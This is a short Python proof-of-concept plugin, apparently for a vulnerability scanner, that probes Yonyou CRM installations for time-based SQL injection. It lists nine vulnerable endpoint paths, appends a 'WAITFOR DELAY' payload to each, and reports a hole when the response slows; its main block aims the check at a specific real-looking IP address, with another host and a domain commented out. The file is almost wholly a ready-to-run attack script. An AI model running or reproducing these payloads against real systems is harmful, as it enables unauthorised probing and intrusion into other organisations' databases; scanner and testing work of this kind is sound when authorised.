#/usr/bin/python
#-*- coding: utf-8 -*-

"""
POC Name  :  用友crm n处sql注入合集
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/searchbug.php?q=55So5Y%2BLIGNybQ%3D%3D&showall=1&pNO=1
refer     :  http://www.wooyun.org/bugs/wooyun-2010-083458
refer     :  http://www.wooyun.org/bugs/wooyun-2010-083452

"""

import re
import time

def assign(service, arg):
    if service == "yongyou_crm":
        return True, arg    

def audit(arg):
    payloads = [
    'background/festivalremind.php?ID=1',
    'background/smsstatusreport.php?ID=1',
    'background/onlinemeetingstatus.php?ID=1',
    'background/sendsms.php?ID=1',
    'pub/bgtaskreq.php?svr=1',
    'login/forgetpswd.php?orgcode=admin&loginname=admin',
    'background/recievesms.php?ID=1',
    'webservice/service.php?class=WS_System&orgcode=1',
    'background/festivalremind.php?ID=99999',
    ]
    for payload in payloads:
        url = arg + payload
        poc = url + ";%20WAITFOR%20DELAY%20%270:0:5%27--"
        time0 = time.time()
        code, head, res, errcode, _ = curl.curl2(url)
        time1 = time.time()
        code, head, res, errcode, _ = curl.curl2(poc)
        time2 = time.time()
        if ((time2 - time1) - (time1 - time0)) >= 4:
            security_hole(url + '   sql injection!')
            
if __name__ == '__main__':
    from dummy import *
    # audit(assign('yongyou_crm', 'http://crm.transn.net/')[1])
    audit(assign('yongyou_crm', 'http://218.94.82.23/')[1])
    # audit(assign('yongyou_crm', 'http://220.113.5.194/')[1])